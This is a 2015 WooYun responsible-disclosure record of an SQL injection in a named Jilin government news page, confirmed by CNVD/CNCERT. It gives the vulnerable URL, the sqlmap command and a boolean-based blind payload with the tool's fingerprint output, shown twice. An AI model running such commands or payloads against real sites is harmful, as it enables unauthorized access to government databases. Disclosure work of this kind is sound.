wybug_title: 吉林省某政府网站sql注入 可获大量信息
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-01-19：	细节已通知厂商并且等待厂商处理中									2015-01-22：	厂商已经确认，细节仅向厂商公开									2015-02-01：	细节向核心白帽子及相关领域专家公开									2015-02-11：	细节向普通白帽子公开									2015-02-21：	细节向实习白帽子公开									2015-03-05：	细节向公众公开  简要描述： 吉林省某政府网站sql注入 可获大量信息 详细说明：  
注入点www.tumen.gov.cn/news/news.asp?id=1193

sqlmap -u www.tumen.gov.cn/news/news.asp?id=1193 -D -T --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:00:32[00:00:33] [INFO] resuming back-end DBMS 'microsoft access' [00:00:33] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1193 AND 3968=3968---[00:00:33] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0
吉林省政府某网站sql注入 可获大量信息，不继续深入，点到为止





   漏洞证明：  
www.tumen.gov.cn/news/news.asp?id=1193

sqlmap -u www.tumen.gov.cn/news/news.asp?id=1193 -D -T --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 00:00:32[00:00:33] [INFO] resuming back-end DBMS 'microsoft access' [00:00:33] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1193 AND 3968=3968---[00:00:33] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP, Microsoft IIS 7.0
吉林省政府某网站sql注入 可获大量信息，不继续深入，点到为止

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-22 15:01 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给吉林分中心，由吉林分中心后续协调网站管理单位处置。  最新状态： 暂无
